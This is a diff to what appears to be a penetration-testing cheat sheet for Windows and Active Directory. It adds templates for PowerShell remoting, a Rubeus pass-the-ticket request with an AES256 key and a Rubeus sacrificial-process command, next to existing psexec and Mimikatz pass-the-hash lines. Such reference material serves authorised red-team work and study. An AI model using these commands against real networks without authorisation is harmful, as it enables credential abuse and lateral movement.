@@ -627,6 +627,12 @@ $ python psexec.py <username>@<IP address>
 C:\> runas /savecred /user:<username> cmd
 ```
 
+- PowerShell Remoting
+
+```
+PS C:\> Enter-PSSession -ComputerName <computer>
+```
+
 - Mimikatz Pass-The-Hash (PTH)
 
 ```
@@ -687,6 +693,8 @@ mimikatz # kerberos::ptt "<ticket.kirbi>"
 C:\> Rubeus.exe dump /nowrap
 C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /rc4:<hash> /ptt
 OR
+C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /aes256:<hash> /ptt
+OR
 C:\> Rubeus.exe ptt /ticket:<ticket.kirbi>
 OR
 C:\> Rubeus.exe ptt /ticket:<base64_ticket>
@@ -710,6 +718,12 @@ mimikatz # sekurlsa::pth /domain:<Domain> /user:<username> /ntlm:<hash>
 ```
 # Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't
 C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /aes256:<hash> /nowrap
+```
+
+- Rubeus Sacrificial Process
+
+```
+C:\> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
 
 #5. - Privilege Escalation
